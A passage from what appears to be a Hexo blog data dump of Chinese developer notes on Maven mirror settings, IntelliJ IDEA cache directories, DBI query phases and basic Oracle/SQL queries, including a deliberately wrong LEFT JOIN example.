class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;settings xmlns=&quot;http://maven.apache.org/SETTINGS/1.0.0&quot;</span><br><span class=\"line\">     xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class=\"line\">     xsi:schemaLocation=&quot;http://maven.apache.org/SETTINGS/1.0.0</span><br><span class=\"line\">                         https://maven.apache.org/xsd/settings-1.0.0.xsd&quot;&gt;</span><br><span class=\"line\">     &lt;localRepository/&gt;</span><br><span class=\"line\">     &lt;interactiveMode/&gt;</span><br><span class=\"line\">     &lt;usePluginRegistry/&gt;</span><br><span class=\"line\">     &lt;offline/&gt;</span><br><span class=\"line\">     &lt;pluginGroups/&gt;</span><br><span class=\"line\">     &lt;servers/&gt;</span><br><span class=\"line\">     &lt;mirrors/&gt;</span><br><span class=\"line\">     &lt;proxies/&gt;</span><br><span class=\"line\">     &lt;profiles/&gt;</span><br><span class=\"line\">     &lt;activeProfiles/&gt;</span><br><span class=\"line\">   &lt;/settings&gt;</span><br></pre></td></tr></table></figure></p>\n<p>阿里云镜像配置<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;mirrors&gt;</span><br><span class=\"line\">    &lt;mirror&gt;</span><br><span class=\"line\">      &lt;id&gt;alimaven&lt;/id&gt;</span><br><span class=\"line\">      &lt;name&gt;aliyun maven&lt;/name&gt;</span><br><span class=\"line\">      &lt;url&gt;</span><br><span class=\"line\">          http://maven.aliyun.com/nexus/content/groups/public/</span><br><span class=\"line\">      &lt;/url&gt;</span><br><span class=\"line\">      &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;        </span><br><span class=\"line\">    &lt;/mirror&gt;</span><br><span class=\"line\">  &lt;/mirrors&gt;</span><br></pre></td></tr></table></figure></p>\n<p>其他镜像<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;mirrors&gt;</span><br><span class=\"line\">        &lt;!-- 中央仓库在中国的镜像 --&gt;</span><br><span class=\"line\">        &lt;mirror&gt;</span><br><span class=\"line\">            &lt;id&gt;maven.net.cn&lt;/id&gt;</span><br><span class=\"line\">            &lt;name&gt;oneof the central mirrors in china&lt;/name&gt;</span><br><span class=\"line\">            &lt;url&gt;http://maven.net.cn/content/groups/public/&lt;/url&gt;</span><br><span class=\"line\">            &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;</span><br><span class=\"line\">        &lt;/mirror&gt;</span><br><span class=\"line\">        &lt;mirror&gt;</span><br><span class=\"line\">            &lt;id&gt;alimaven&lt;/id&gt;</span><br><span class=\"line\">            &lt;name&gt;aliyun maven&lt;/name&gt;</span><br><span class=\"line\">            &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt;</span><br><span class=\"line\">            &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;</span><br><span class=\"line\">        &lt;/mirror&gt;</span><br><span class=\"line\">        &lt;mirror&gt;</span><br><span class=\"line\">            &lt;id&gt;central&lt;/id&gt;</span><br><span class=\"line\">            &lt;name&gt;Maven Repository Switchboard&lt;/name&gt;</span><br><span class=\"line\">            &lt;url&gt;http://repo1.maven.org/maven2/&lt;/url&gt;</span><br><span class=\"line\">            &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;</span><br><span class=\"line\">        &lt;/mirror&gt;</span><br><span class=\"line\">        &lt;mirror&gt;</span><br><span class=\"line\">            &lt;id&gt;repo2&lt;/id&gt;</span><br><span class=\"line\">            &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;</span><br><span class=\"line\">            &lt;name&gt;Human Readable Name for this Mirror.&lt;/name&gt;</span><br><span class=\"line\">            &lt;url&gt;http://repo2.maven.org/maven2/&lt;/url&gt;</span><br><span class=\"line\">        &lt;/mirror&gt;</span><br><span class=\"line\">        &lt;mirror&gt;</span><br><span class=\"line\">            &lt;id&gt;ibiblio&lt;/id&gt;</span><br><span class=\"line\">            &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;</span><br><span class=\"line\">            &lt;name&gt;Human Readable Name for this Mirror.&lt;/name&gt;</span><br><span class=\"line\">            &lt;url&gt;http://mirrors.ibiblio.org/pub/mirrors/maven2/&lt;/url&gt;</span><br><span class=\"line\">        &lt;/mirror&gt;</span><br><span class=\"line\">        &lt;mirror&gt;</span><br><span class=\"line\">            &lt;id&gt;jboss-public-repository-group&lt;/id&gt;</span><br><span class=\"line\">            &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;</span><br><span class=\"line\">            &lt;name&gt;JBoss Public Repository Group&lt;/name&gt;</span><br><span class=\"line\">            &lt;url&gt;http://repository.jboss.org/nexus/content/groups/public&lt;/url&gt;</span><br><span class=\"line\">        &lt;/mirror&gt;</span><br></pre></td></tr></table></figure></p>\n"},{"title":"idea 配置缓存历史记录","date":"2018-07-10T13:09:19.000Z","_content":"#### [All the files are located under this directory by default:](https://intellij-support.jetbrains.com/hc/en-us/articles/206544519-Directories-used-by-the-IDE-to-store-settings-caches-plugins-and-logs)\r\n\r\nWindows Vista, 7, 8, 10:\r\n\r\n<SYSTEM DRIVE>\\Users\\<USER ACCOUNT NAME>\\.<PRODUCT><VERSION>\r\n\r\nUnder this directory you'll find the following sub-directories\r\n\r\nconfig: configuration (idea.config.path)\r\n\r\nconfig\\plugins: plugins (idea.plugins.path)\r\n\r\nsystem: caches, local history, etc (idea.system.path)\r\n\r\nsystem\\log: logs and thread dumps (idea.log.path)\r\n\r\n#### [change the defaults](https://intellij-support.jetbrains.com/hc/en-us/articles/207240985-Changing-IDE-default-directories-used-for-config-plugins-and-caches-storage?sort_by=created_at)\r\nFollow the comments in IDE_HOME\\bin\\idea.properties file to change the defaults, make sure to uncomment the lines defining these properties:\r\nidea.config.path\r\nidea.system.path\r\nidea.plugins.path\r\nidea.log.path\r\nExample:\r\n```\r\nidea.config.path=c:/work/idea/caches/trunk-config\r\nidea.system.path=c:/work/idea/caches/trunk-system\r\nidea.plugins.path=c:/work/idea/caches/trunk-plugins\r\n```\r\n\r\n#### [IDE Settings](https://www.jetbrains.com/help/idea/project-and-ide-settings.html)\r\nIDE settings are stored in the dedicated directories under IntelliJ IDEA home directory. The IntelliJ IDEA directory name is composed of the product name and version.\r\n\r\nFor IntelliJ IDEA Community edition the folder name is .IdeaICXX.\r\n\r\nFor example:\r\n\r\nWindows\r\n```\r\n<User home>\\.IntelliJIdeaXX\\config that contains user-specific settings.\r\n<User home>\\.IntelliJIdeaXX\\system that stores IntelliJ IDEA data caches.\r\n<User home> in WindowsXP is C:\\Documents and Settings\\<User name>\\;\r\n```\r\nin Windows Vista it is C:\\Users\\<User name>\\\r\n","source":"_posts/开发工具/idea 配置缓存历史记录.md","raw":"---\ntitle: idea 配置缓存历史记录\ndate: 2018-07-10 21:09:19\ntags: 开发工具\n---\n#### [All the files are located under this directory by default:](https://intellij-support.jetbrains.com/hc/en-us/articles/206544519-Directories-used-by-the-IDE-to-store-settings-caches-plugins-and-logs)\r\n\r\nWindows Vista, 7, 8, 10:\r\n\r\n<SYSTEM DRIVE>\\Users\\<USER ACCOUNT NAME>\\.<PRODUCT><VERSION>\r\n\r\nUnder this directory you'll find the following sub-directories\r\n\r\nconfig: configuration (idea.config.path)\r\n\r\nconfig\\plugins: plugins (idea.plugins.path)\r\n\r\nsystem: caches, local history, etc (idea.system.path)\r\n\r\nsystem\\log: logs and thread dumps (idea.log.path)\r\n\r\n#### [change the defaults](https://intellij-support.jetbrains.com/hc/en-us/articles/207240985-Changing-IDE-default-directories-used-for-config-plugins-and-caches-storage?sort_by=created_at)\r\nFollow the comments in IDE_HOME\\bin\\idea.properties file to change the defaults, make sure to uncomment the lines defining these properties:\r\nidea.config.path\r\nidea.system.path\r\nidea.plugins.path\r\nidea.log.path\r\nExample:\r\n```\r\nidea.config.path=c:/work/idea/caches/trunk-config\r\nidea.system.path=c:/work/idea/caches/trunk-system\r\nidea.plugins.path=c:/work/idea/caches/trunk-plugins\r\n```\r\n\r\n#### [IDE Settings](https://www.jetbrains.com/help/idea/project-and-ide-settings.html)\r\nIDE settings are stored in the dedicated directories under IntelliJ IDEA home directory. The IntelliJ IDEA directory name is composed of the product name and version.\r\n\r\nFor IntelliJ IDEA Community edition the folder name is .IdeaICXX.\r\n\r\nFor example:\r\n\r\nWindows\r\n```\r\n<User home>\\.IntelliJIdeaXX\\config that contains user-specific settings.\r\n<User home>\\.IntelliJIdeaXX\\system that stores IntelliJ IDEA data caches.\r\n<User home> in WindowsXP is C:\\Documents and Settings\\<User name>\\;\r\n```\r\nin Windows Vista it is C:\\Users\\<User name>\\\r\n","slug":"开发工具/idea 配置缓存历史记录","published":1,"updated":"2018-07-10T13:10:10.000Z","_id":"cjjedmhcm008r0gtj09zjsno1","comments":1,"layout":"post","photos":[],"link":"","content":"<h4 id=\"All-the-files-are-located-under-this-directory-by-default\"><a href=\"#All-the-files-are-located-under-this-directory-by-default\" class=\"headerlink\" title=\"All the files are located under this directory by default:\"></a><a href=\"https://intellij-support.jetbrains.com/hc/en-us/articles/206544519-Directories-used-by-the-IDE-to-store-settings-caches-plugins-and-logs\" target=\"_blank\" rel=\"noopener\">All the files are located under this directory by default:</a></h4><p>Windows Vista, 7, 8, 10:</p>\n<p><system drive=\"\">\\Users\\<user account=\"\" name=\"\">.<product><version></version></product></user></system></p>\n<p>Under this directory you’ll find the following sub-directories</p>\n<p>config: configuration (idea.config.path)</p>\n<p>config\\plugins: plugins (idea.plugins.path)</p>\n<p>system: caches, local history, etc (idea.system.path)</p>\n<p>system\\log: logs and thread dumps (idea.log.path)</p>\n<h4 id=\"change-the-defaults\"><a href=\"#change-the-defaults\" class=\"headerlink\" title=\"change the defaults\"></a><a href=\"https://intellij-support.jetbrains.com/hc/en-us/articles/207240985-Changing-IDE-default-directories-used-for-config-plugins-and-caches-storage?sort_by=created_at\" target=\"_blank\" rel=\"noopener\">change the defaults</a></h4><p>Follow the comments in IDE_HOME\\bin\\idea.properties file to change the defaults, make sure to uncomment the lines defining these properties:<br>idea.config.path<br>idea.system.path<br>idea.plugins.path<br>idea.log.path<br>Example:</p>\n<pre><code>idea.config.path=c:/work/idea/caches/trunk-config\nidea.system.path=c:/work/idea/caches/trunk-system\nidea.plugins.path=c:/work/idea/caches/trunk-plugins\n</code></pre><h4 id=\"IDE-Settings\"><a href=\"#IDE-Settings\" class=\"headerlink\" title=\"IDE Settings\"></a><a href=\"https://www.jetbrains.com/help/idea/project-and-ide-settings.html\" target=\"_blank\" rel=\"noopener\">IDE Settings</a></h4><p>IDE settings are stored in the dedicated directories under IntelliJ IDEA home directory. The IntelliJ IDEA directory name is composed of the product name and version.</p>\n<p>For IntelliJ IDEA Community edition the folder name is .IdeaICXX.</p>\n<p>For example:</p>\n<p>Windows</p>\n<pre><code>&lt;User home&gt;\\.IntelliJIdeaXX\\config that contains user-specific settings.\n&lt;User home&gt;\\.IntelliJIdeaXX\\system that stores IntelliJ IDEA data caches.\n&lt;User home&gt; in WindowsXP is C:\\Documents and Settings\\&lt;User name&gt;\\;\n</code></pre><p>in Windows Vista it is C:\\Users\\<user name=\"\">\\</user></p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"All-the-files-are-located-under-this-directory-by-default\"><a href=\"#All-the-files-are-located-under-this-directory-by-default\" class=\"headerlink\" title=\"All the files are located under this directory by default:\"></a><a href=\"https://intellij-support.jetbrains.com/hc/en-us/articles/206544519-Directories-used-by-the-IDE-to-store-settings-caches-plugins-and-logs\" target=\"_blank\" rel=\"noopener\">All the files are located under this directory by default:</a></h4><p>Windows Vista, 7, 8, 10:</p>\n<p><system drive=\"\">\\Users\\<user account=\"\" name=\"\">.<product><version></version></product></user></system></p>\n<p>Under this directory you’ll find the following sub-directories</p>\n<p>config: configuration (idea.config.path)</p>\n<p>config\\plugins: plugins (idea.plugins.path)</p>\n<p>system: caches, local history, etc (idea.system.path)</p>\n<p>system\\log: logs and thread dumps (idea.log.path)</p>\n<h4 id=\"change-the-defaults\"><a href=\"#change-the-defaults\" class=\"headerlink\" title=\"change the defaults\"></a><a href=\"https://intellij-support.jetbrains.com/hc/en-us/articles/207240985-Changing-IDE-default-directories-used-for-config-plugins-and-caches-storage?sort_by=created_at\" target=\"_blank\" rel=\"noopener\">change the defaults</a></h4><p>Follow the comments in IDE_HOME\\bin\\idea.properties file to change the defaults, make sure to uncomment the lines defining these properties:<br>idea.config.path<br>idea.system.path<br>idea.plugins.path<br>idea.log.path<br>Example:</p>\n<pre><code>idea.config.path=c:/work/idea/caches/trunk-config\nidea.system.path=c:/work/idea/caches/trunk-system\nidea.plugins.path=c:/work/idea/caches/trunk-plugins\n</code></pre><h4 id=\"IDE-Settings\"><a href=\"#IDE-Settings\" class=\"headerlink\" title=\"IDE Settings\"></a><a href=\"https://www.jetbrains.com/help/idea/project-and-ide-settings.html\" target=\"_blank\" rel=\"noopener\">IDE Settings</a></h4><p>IDE settings are stored in the dedicated directories under IntelliJ IDEA home directory. The IntelliJ IDEA directory name is composed of the product name and version.</p>\n<p>For IntelliJ IDEA Community edition the folder name is .IdeaICXX.</p>\n<p>For example:</p>\n<p>Windows</p>\n<pre><code>&lt;User home&gt;\\.IntelliJIdeaXX\\config that contains user-specific settings.\n&lt;User home&gt;\\.IntelliJIdeaXX\\system that stores IntelliJ IDEA data caches.\n&lt;User home&gt; in WindowsXP is C:\\Documents and Settings\\&lt;User name&gt;\\;\n</code></pre><p>in Windows Vista it is C:\\Users\\<user name=\"\">\\</user></p>\n"},{"title":"select 执行过程","date":"2018-07-10T13:09:19.000Z","_content":"```\n操作数据库\n执行简单查询\n应用程序与数据库之间最常见的操作是从数据库中查询并且提取数据。在标准的 SQL 语句规范中，这一过程是使用关键字 SELECT 的。\n一个通过 DBI 执行的标准简单查询包括以下四个阶段：\n准备阶段（Perpare SQL statement）：\n通过调用 prepare（）方法，准备阶段解析 SQL 语句，对 SQL 语句进行验证，并且返回一个执行语句句柄，这个句柄代表将在数据库内被执行的这条 SQL 语句。\n执行阶段（Execute select statement）：\n通过调用 execute（）方法，执行阶段执行 SQL 语句，查询数据库，并且以被查询的数据填充 Perl 的数据结构。但是，在这一阶段中，你的 Perl 应用程序并未真正地访问到被查询的数据。\n数据抽取阶段（fetching date）：\n第三阶段被称为数据抽取阶段，在这一阶段实际的数据从数据库中被抽取出来，通过调用 fetch（）方法族的一组方法。数据抽取阶段从数据库得到查询所得的数据，以每一条数据为单位，注入 Perl 的数据结构。DBI 提供了多种方法对数据进行抽取，可以将被抽取的数据用一个列表，一个指向数组的引用，或是一个指向哈希表的引用的方式提供给应用程序。而且每条记录中字段的顺序也是由 SQL 语句中指定的顺序所决定。一个包含三种方法的例子见程序四。\n完成阶段（finishing date fetch）：\n最后一个阶段被称为完成阶段，这个阶段主要释放资源，并且清理相关数据结构中保存的历史信息，通过显式地调用 finish（）方法来完成。当一个执行语句句柄（statement handler）被成功执行后，它的状态会被标记成为活跃。你可以通过访问执行语句句柄的 Active 属性来访问它。在用户执行 fetch（）方法，从数据库中抽取了最后一列数据之后，数据库驱动自动关闭数据库中正在进行地和这个执行语句句柄有关的工作，并且重置 Active 属性为不活跃状态。这一切工作都是在读取了最后一列数据之后被自动触发，在大多数情况下，用户并不需要额外地关心这一过程中后台所作的工作。某些额外情况，需要应用程序主动调用 finish（）方法释放资源。一个典型的例子就是：当数据库占用了数目可观的磁盘空间存储临时文件，存放查询结果，而应用程序又不需要保存所有的查询结果。比如执行一条形如 “SELECT EMP_DEP, count(*) FROM EMP GROUP BY EMP_DEP ORDER BY count(*) DESC”的 SQL 语句，在应用程序只需要部分统计结果的情况，应该显示调用 finish（）方法，释放被申请和占用的机器资源。","source":"_posts/数据库/select 执行过程.md","raw":"---\ntitle: select 执行过程\ndate: 2018-07-10 21:09:19\ntags: 数据库\n---\n```\n操作数据库\n执行简单查询\n应用程序与数据库之间最常见的操作是从数据库中查询并且提取数据。在标准的 SQL 语句规范中，这一过程是使用关键字 SELECT 的。\n一个通过 DBI 执行的标准简单查询包括以下四个阶段：\n准备阶段（Perpare SQL statement）：\n通过调用 prepare（）方法，准备阶段解析 SQL 语句，对 SQL 语句进行验证，并且返回一个执行语句句柄，这个句柄代表将在数据库内被执行的这条 SQL 语句。\n执行阶段（Execute select statement）：\n通过调用 execute（）方法，执行阶段执行 SQL 语句，查询数据库，并且以被查询的数据填充 Perl 的数据结构。但是，在这一阶段中，你的 Perl 应用程序并未真正地访问到被查询的数据。\n数据抽取阶段（fetching date）：\n第三阶段被称为数据抽取阶段，在这一阶段实际的数据从数据库中被抽取出来，通过调用 fetch（）方法族的一组方法。数据抽取阶段从数据库得到查询所得的数据，以每一条数据为单位，注入 Perl 的数据结构。DBI 提供了多种方法对数据进行抽取，可以将被抽取的数据用一个列表，一个指向数组的引用，或是一个指向哈希表的引用的方式提供给应用程序。而且每条记录中字段的顺序也是由 SQL 语句中指定的顺序所决定。一个包含三种方法的例子见程序四。\n完成阶段（finishing date fetch）：\n最后一个阶段被称为完成阶段，这个阶段主要释放资源，并且清理相关数据结构中保存的历史信息，通过显式地调用 finish（）方法来完成。当一个执行语句句柄（statement handler）被成功执行后，它的状态会被标记成为活跃。你可以通过访问执行语句句柄的 Active 属性来访问它。在用户执行 fetch（）方法，从数据库中抽取了最后一列数据之后，数据库驱动自动关闭数据库中正在进行地和这个执行语句句柄有关的工作，并且重置 Active 属性为不活跃状态。这一切工作都是在读取了最后一列数据之后被自动触发，在大多数情况下，用户并不需要额外地关心这一过程中后台所作的工作。某些额外情况，需要应用程序主动调用 finish（）方法释放资源。一个典型的例子就是：当数据库占用了数目可观的磁盘空间存储临时文件，存放查询结果，而应用程序又不需要保存所有的查询结果。比如执行一条形如 “SELECT EMP_DEP, count(*) FROM EMP GROUP BY EMP_DEP ORDER BY count(*) DESC”的 SQL 语句，在应用程序只需要部分统计结果的情况，应该显示调用 finish（）方法，释放被申请和占用的机器资源。","slug":"数据库/select 执行过程","published":1,"updated":"2018-07-10T13:10:10.004Z","_id":"cjjedmhco008u0gtjpnjddc00","comments":1,"layout":"post","photos":[],"link":"","content":"<p><code>`</code><br>操作数据库<br>执行简单查询<br>应用程序与数据库之间最常见的操作是从数据库中查询并且提取数据。在标准的 SQL 语句规范中，这一过程是使用关键字 SELECT 的。<br>一个通过 DBI 执行的标准简单查询包括以下四个阶段：<br>准备阶段（Perpare SQL statement）：<br>通过调用 prepare（）方法，准备阶段解析 SQL 语句，对 SQL 语句进行验证，并且返回一个执行语句句柄，这个句柄代表将在数据库内被执行的这条 SQL 语句。<br>执行阶段（Execute select statement）：<br>通过调用 execute（）方法，执行阶段执行 SQL 语句，查询数据库，并且以被查询的数据填充 Perl 的数据结构。但是，在这一阶段中，你的 Perl 应用程序并未真正地访问到被查询的数据。<br>数据抽取阶段（fetching date）：<br>第三阶段被称为数据抽取阶段，在这一阶段实际的数据从数据库中被抽取出来，通过调用 fetch（）方法族的一组方法。数据抽取阶段从数据库得到查询所得的数据，以每一条数据为单位，注入 Perl 的数据结构。DBI 提供了多种方法对数据进行抽取，可以将被抽取的数据用一个列表，一个指向数组的引用，或是一个指向哈希表的引用的方式提供给应用程序。而且每条记录中字段的顺序也是由 SQL 语句中指定的顺序所决定。一个包含三种方法的例子见程序四。<br>完成阶段（finishing date fetch）：<br>最后一个阶段被称为完成阶段，这个阶段主要释放资源，并且清理相关数据结构中保存的历史信息，通过显式地调用 finish（）方法来完成。当一个执行语句句柄（statement handler）被成功执行后，它的状态会被标记成为活跃。你可以通过访问执行语句句柄的 Active 属性来访问它。在用户执行 fetch（）方法，从数据库中抽取了最后一列数据之后，数据库驱动自动关闭数据库中正在进行地和这个执行语句句柄有关的工作，并且重置 Active 属性为不活跃状态。这一切工作都是在读取了最后一列数据之后被自动触发，在大多数情况下，用户并不需要额外地关心这一过程中后台所作的工作。某些额外情况，需要应用程序主动调用 finish（）方法释放资源。一个典型的例子就是：当数据库占用了数目可观的磁盘空间存储临时文件，存放查询结果，而应用程序又不需要保存所有的查询结果。比如执行一条形如 “SELECT EMP_DEP, count(<em>) FROM EMP GROUP BY EMP_DEP ORDER BY count(</em>) DESC”的 SQL 语句，在应用程序只需要部分统计结果的情况，应该显示调用 finish（）方法，释放被申请和占用的机器资源。</p>\n","site":{"data":{}},"excerpt":"","more":"<p><code>`</code><br>操作数据库<br>执行简单查询<br>应用程序与数据库之间最常见的操作是从数据库中查询并且提取数据。在标准的 SQL 语句规范中，这一过程是使用关键字 SELECT 的。<br>一个通过 DBI 执行的标准简单查询包括以下四个阶段：<br>准备阶段（Perpare SQL statement）：<br>通过调用 prepare（）方法，准备阶段解析 SQL 语句，对 SQL 语句进行验证，并且返回一个执行语句句柄，这个句柄代表将在数据库内被执行的这条 SQL 语句。<br>执行阶段（Execute select statement）：<br>通过调用 execute（）方法，执行阶段执行 SQL 语句，查询数据库，并且以被查询的数据填充 Perl 的数据结构。但是，在这一阶段中，你的 Perl 应用程序并未真正地访问到被查询的数据。<br>数据抽取阶段（fetching date）：<br>第三阶段被称为数据抽取阶段，在这一阶段实际的数据从数据库中被抽取出来，通过调用 fetch（）方法族的一组方法。数据抽取阶段从数据库得到查询所得的数据，以每一条数据为单位，注入 Perl 的数据结构。DBI 提供了多种方法对数据进行抽取，可以将被抽取的数据用一个列表，一个指向数组的引用，或是一个指向哈希表的引用的方式提供给应用程序。而且每条记录中字段的顺序也是由 SQL 语句中指定的顺序所决定。一个包含三种方法的例子见程序四。<br>完成阶段（finishing date fetch）：<br>最后一个阶段被称为完成阶段，这个阶段主要释放资源，并且清理相关数据结构中保存的历史信息，通过显式地调用 finish（）方法来完成。当一个执行语句句柄（statement handler）被成功执行后，它的状态会被标记成为活跃。你可以通过访问执行语句句柄的 Active 属性来访问它。在用户执行 fetch（）方法，从数据库中抽取了最后一列数据之后，数据库驱动自动关闭数据库中正在进行地和这个执行语句句柄有关的工作，并且重置 Active 属性为不活跃状态。这一切工作都是在读取了最后一列数据之后被自动触发，在大多数情况下，用户并不需要额外地关心这一过程中后台所作的工作。某些额外情况，需要应用程序主动调用 finish（）方法释放资源。一个典型的例子就是：当数据库占用了数目可观的磁盘空间存储临时文件，存放查询结果，而应用程序又不需要保存所有的查询结果。比如执行一条形如 “SELECT EMP_DEP, count(<em>) FROM EMP GROUP BY EMP_DEP ORDER BY count(</em>) DESC”的 SQL 语句，在应用程序只需要部分统计结果的情况，应该显示调用 finish（）方法，释放被申请和占用的机器资源。</p>\n"},{"title":"sql语句","date":"2018-07-10T13:09:19.000Z","_content":"- #### oracle 取前10条记录\r\n\r\n 1) select * from tbname where rownum < 11;\r\n\r\n 2) select * from (select * from tbname order by id desc ) where rownum<=10;","source":"_posts/数据库/sql语句.md","raw":"---\ntitle: sql语句\ndate: 2018-07-10 21:09:19\ntags: 数据库\n---\n- #### oracle 取前10条记录\r\n\r\n 1) select * from tbname where rownum < 11;\r\n\r\n 2) select * from (select * from tbname order by id desc ) where rownum<=10;","slug":"数据库/sql语句","published":1,"updated":"2018-07-10T13:10:10.007Z","_id":"cjjedmhcp008w0gtjo6b5nw7y","comments":1,"layout":"post","photos":[],"link":"","content":"<ul>\n<li><h4 id=\"oracle-取前10条记录\"><a href=\"#oracle-取前10条记录\" class=\"headerlink\" title=\"oracle 取前10条记录\"></a>oracle 取前10条记录</h4><p>1) select * from tbname where rownum &lt; 11;</p>\n<p>2) select <em> from (select </em> from tbname order by id desc ) where rownum&lt;=10;</p>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<ul>\n<li><h4 id=\"oracle-取前10条记录\"><a href=\"#oracle-取前10条记录\" class=\"headerlink\" title=\"oracle 取前10条记录\"></a>oracle 取前10条记录</h4><p>1) select * from tbname where rownum &lt; 11;</p>\n<p>2) select <em> from (select </em> from tbname order by id desc ) where rownum&lt;=10;</p>\n</li>\n</ul>\n"},{"title":"sql左联错误示范","date":"2018-07-10T13:09:19.000Z","_content":"```\nSELECT\n  a.first_ratio,\n  a.second_ratio,\n  a.organ_flag,\n  a.question_score,\n  a.prodta_no,\n  a.paper_type,\n  a.question_no,\n  d.base_score,\n  a.delete_flag AS myflag,\n  d.delete_flag\nFROM\n  hs_asset.eligpaperquestrel a LEFT JOIN hs_asset.eligpaper d\n    ON a.paper_type = d.paper_type\n       AND a.prodta_no = d.prodta_no\n       AND a.organ_flag = d.organ_flag\n       AND d.delete_flag = '0' -- ORDER BY a.question_no\n--AND a.delete_flag = '0'\nWHERE A.QUESTION_NO = '53' AND a.paper_type = '-' AND a.prodta_no = ' ';\n```","source":"_posts/数据库/sql左联错误示范.md","raw":"---\ntitle: sql左联错误示范\ndate: 2018-07-10 21:09:19\ntags: 数据库\n---\n```\nSELECT\n  a.first_ratio,\n  a.second_ratio,\n  a.organ_flag,\n  a.question_score,\n  a.prodta_no,\n  a.paper_type,\n  a.question_no,\n  d.base_score,\n  a.delete_flag AS myflag,\n  d.delete_flag\nFROM\n  hs_asset.eligpaperquestrel a LEFT JOIN hs_asset.eligpaper d\n    ON a.paper_type = d.paper_type\n       AND a.prodta_no = d.prodta_no\n       AND a.organ_flag = d.organ_flag\n       AND d.delete_flag = '0' -- ORDER BY a.question_no\n--AND a.delete_flag = '0'\nWHERE A.QUESTION_NO = '53' AND a.paper_type = '-' AND a.prodta_no = ' ';\n```","slug":"数据库/sql左联错误示范","published":1,"updated":"2018-07-10T13:10:10.006Z","_id":"cjjedmhcr008z0gtj3rzhy3s6","comments":1,"layout":"post","photos":[],"link":"","content":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SELECT</span><br><span class=\"line\">  a.first_ratio,</span><br><span class=\"line\">  a.second_ratio,</span><br><span class=\"line\">  a.organ_flag,</span><br><span class=\"line\">  a.question_score,</span><br><span class=\"line\">  a.prodta_no,</span><br><span class=\"line\">  a.paper_type,</span><br><span class=\"line\">  a.question_no,</span><br><span class=\"line\">  d.base_score,</span><br><span class=\"line\">  a.delete_flag AS myflag,</span><br><span class=\"line\">  d.delete_flag</span><br><span class=\"line\">FROM</span><br><span class=\"line\">  hs_asset.eligpaperquestrel a LEFT JOIN hs_asset.eligpaper d</span><br><span class=\"line\">    ON a.paper_type = d.paper_type</span><br><span class=\"line\">       AND a.prodta_no = d.prodta_no</span><br><span class=\"line\">       AND a.organ_flag = d.organ_flag</span><br><span class=\"line\">       AND d.delete_flag = &apos;0&apos; -- ORDER BY a.question_no</span><br><span class=\"line\">--AND a.delete_flag = &apos;0&apos;</span><br><span class=\"line\">WHERE A.QUESTION_NO = &apos;53&apos; AND a.paper_type = &apos;-&apos; AND a.prodta_no = &apos; &apos;;</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SELECT</span><br><span class=\"line\">  a.first_ratio,</span><br><span class=\"line\">  a.second_ratio,</span><br><span class=\"line\">  